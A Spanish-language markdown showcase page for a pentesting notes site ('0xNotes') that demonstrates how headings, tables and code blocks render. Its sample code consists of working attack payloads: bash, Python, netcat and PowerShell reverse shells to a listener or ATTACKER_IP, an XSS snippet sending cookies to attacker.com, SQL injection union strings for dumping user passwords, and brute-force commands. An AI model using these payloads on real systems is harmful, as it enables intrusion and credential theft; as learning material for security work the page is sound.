# 🎨 Ejemplos Visuales del Diseño

Este documento muestra ejemplos de todos los elementos de diseño implementados en 0xNotes.

## Encabezados

# H1 - Título Principal en Verde Neón

## H2 - Subtítulo con Borde Verde

### H3 - Tercer Nivel

#### H4 - Cuarto Nivel

---

## Texto y Formato

Este es un párrafo normal con texto regular. Puedes incluir **texto en negrita** y *texto en cursiva*. También puedes combinarlos: ***negrita y cursiva***.

Aquí hay un enlace de ejemplo: [GitHub](https://github.com)

---

## Código

### Código Inline

Usa el comando `ls -la` para listar archivos, o ejecuta `nmap -sV 192.168.1.1` para escanear.

Instala paquetes con `pip install requests` o `npm install express`.

### Bloques de Código

#### Bash

```bash
# Escaneo de puertos con Nmap
nmap -sC -sV -p- 192.168.1.100

# Reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Buscar archivos SUID
find / -perm -u=s -type f 2>/dev/null
```

#### Python

```python
import socket
import subprocess

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)
    
    s.close()

# Uso
reverse_shell('10.0.0.1', 4444)
```

#### JavaScript

```javascript
// XSS Payload
function stealCookies() {
    const cookies = document.cookie;
    const img = new Image();
    img.src = `http://attacker.com/steal?cookie=${cookies}`;
}

// Fetch API
fetch('http://api.example.com/data', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        username: 'admin',
        password: 'password123'
    })
});
```

#### SQL

```sql
-- SQL Injection Union-based
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT username, password, email FROM users--

-- Extraer información de la base de datos
SELECT table_name 
FROM information_schema.tables 
WHERE table_schema = database();

-- Dump de usuarios
SELECT username, password 
FROM users 
WHERE admin = 1;
```

#### PowerShell

```powershell
# Información del sistema
Get-ComputerInfo
systeminfo

# Usuarios administradores
Get-LocalGroupMember -Group "Administrators"

# Procesos en ejecución
Get-Process | Where-Object {$_.CPU -gt 100}

# Reverse shell
$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
```

---

## Listas

### Lista Desordenada

- Reconocimiento
- Enumeración
  - Escaneo de puertos
  - Identificación de servicios
  - Búsqueda de vulnerabilidades
- Explotación
  - SQL Injection
  - XSS
  - CSRF
- Post-explotación
  - Escalada de privilegios
  - Persistencia
  - Exfiltración

### Lista Ordenada

1. Configurar el entorno
2. Realizar reconocimiento pasivo
3. Escanear la red objetivo
4. Enumerar servicios
5. Identificar vulnerabilidades
6. Desarrollar exploit
7. Ejecutar ataque
8. Obtener acceso
9. Escalar privilegios
10. Documentar hallazgos

### Lista de Tareas

- [x] Instalar Kali Linux
- [x] Configurar Burp Suite
- [x] Aprender Nmap
- [ ] Completar OSCP
- [ ] Obtener certificación CEH
- [ ] Practicar en HackTheBox

---

## Tablas

### Tabla Simple

| Herramienta | Categoría | Uso Principal |
|-------------|-----------|---------------|
| Nmap | Reconocimiento | Escaneo de puertos |
| Metasploit | Explotación | Framework de exploits |
| Burp Suite | Web Testing | Proxy interceptor |
| Wireshark | Network Analysis | Análisis de tráfico |
| John the Ripper | Password Cracking | Crackeo de hashes |

### Tabla de Comandos

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `nmap` | Escaneo de red | `nmap -sV target.com` |
| `sqlmap` | SQL Injection | `sqlmap -u "url" --dbs` |
| `hydra` | Brute force | `hydra -L users.txt -P pass.txt ssh://target` |
| `gobuster` | Directory brute forcing | `gobuster dir -u url -w wordlist.txt` |
| `nikto` | Web scanner | `nikto -h target.com` |

### Tabla de Puertos

| Puerto | Servicio | Protocolo | Notas |
|--------|----------|-----------|-------|
| 21 | FTP | TCP | File Transfer Protocol |
| 22 | SSH | TCP | Secure Shell |
| 80 | HTTP | TCP | Web sin cifrar |
| 443 | HTTPS | TCP | Web cifrado |
| 445 | SMB | TCP | Compartición de archivos Windows |
| 3306 | MySQL | TCP | Base de datos MySQL |
| 3389 | RDP | TCP | Remote Desktop Protocol |

---

## Blockquotes y Alertas

> Este es un blockquote simple con información adicional.
> Puede contener múltiples líneas.

> **NOTA**: Los blockquotes con **palabras en negrita** se resaltan en verde.

> **IMPORTANTE**: Siempre obtén autorización por escrito antes de realizar pruebas de penetración.

> **TIP**: Usa `--help` para ver todas las opciones de una herramienta.

> **WARNING**: Este exploit puede causar denegación de servicio. Úsalo con precaución.

> **DANGER**: Ejecutar este comando puede dañar el sistema. Solo para entornos de prueba.

---

## Enlaces

Enlaces normales: [OWASP](https://owasp.org/) | [HackTheBox](https://hackthebox.com/) | [TryHackMe](https://tryhackme.com/)

Enlaces con código: Visita [`https://github.com`](https://github.com) para ver el código.

---

## Separadores

Puedes usar líneas horizontales para separar secciones:

---

***

---

## Imágenes

Las imágenes se verían así (ejemplo):

![Logo Example](https://via.placeholder.com/600x200/2d3748/00ff88?text=0xNotes)

---

## Combinaciones

### Código con explicación

Para obtener una reverse shell en Linux:

```bash
# Método 1: Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Método 2: Netcat
nc -e /bin/sh ATTACKER_IP PORT

# Método 3: Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

> **IMPORTANTE**: Reemplaza `ATTACKER_IP` y `PORT` con tus valores reales.

### Tabla con comandos inline

| Acción | Comando |
|--------|---------|
| Escaneo básico | `nmap target.com` |
| Escaneo completo | `nmap -A -p- target.com` |
| Detectar OS | `nmap -O target.com` |
| Scripts NSE | `nmap --script vuln target.com` |

### Lista con código

Pasos para explotar SQL Injection:

1. Detectar vulnerabilidad: `' OR '1'='1`
2. Encontrar columnas: `' UNION SELECT NULL--`
3. Identificar DB: `' UNION SELECT @@version--`
4. Extraer tablas: `' UNION SELECT table_name FROM information_schema.tables--`
5. Dump datos: `' UNION SELECT username,password FROM users--`

---

## Emojis y Símbolos

### Emojis Comunes

🔐 Seguridad | 🌐 Web | 🔧 Herramientas | 💻 Sistemas | 📝 Notas | 🚀 Rápido | ⚡ Eficiente | 🎯 Objetivo | ✅ Completado | ❌ Error | ⚠️ Advertencia | 💡 Idea | 📚 Recursos | 🏆 Logro | 🔍 Búsqueda | 🛡️ Protección

### Símbolos Técnicos

→ ← ↑ ↓ ⇒ ⇐ ⇑ ⇓ • ○ ◆ ◇ ▪ ▫ ► ◄ ▲ ▼ ★ ☆ ✓ ✗ ∞ ≈ ≠ ≤ ≥ ± × ÷ √

---

## Texto Especial

### Código Multilenguaje

Ejemplo de implementación en varios lenguajes:

**Python:**
```python
print("Hello, World!")
```

**JavaScript:**
```javascript
console.log("Hello, World!");
```

**Bash:**
```bash
echo "Hello, World!"
```

**PHP:**
```php
<?php echo "Hello, World!"; ?>
```

---

## Checklist Completa

- [x] Diseño responsivo
- [x] Modo claro/oscuro
- [x] Syntax highlighting
- [x] Búsqueda integrada
- [x] Navegación por teclado
- [x] Copy-to-clipboard
- [x] Paginación
- [x] Sidebar colapsable
- [x] Enlaces internos
- [x] Tablas responsivas
- [x] Código optimizado
- [x] Paleta de colores profesional
- [x] Transiciones suaves
- [x] Accesibilidad mejorada
- [x] Performance optimizado

---

## Resumen Visual

Este documento muestra:

1. ✅ **Encabezados** con diferentes niveles y estilos
2. ✅ **Código inline** resaltado en verde
3. ✅ **Bloques de código** con múltiples lenguajes
4. ✅ **Tablas** con borders y hover effects
5. ✅ **Listas** ordenadas, desordenadas y de tareas
6. ✅ **Blockquotes** con destacados
7. ✅ **Enlaces** con estilo verde
8. ✅ **Emojis** y símbolos
9. ✅ **Combinaciones** de elementos

---

**Prueba el toggle de tema (🌙/☀️) en la esquina inferior derecha para ver cómo cambian todos estos elementos!**
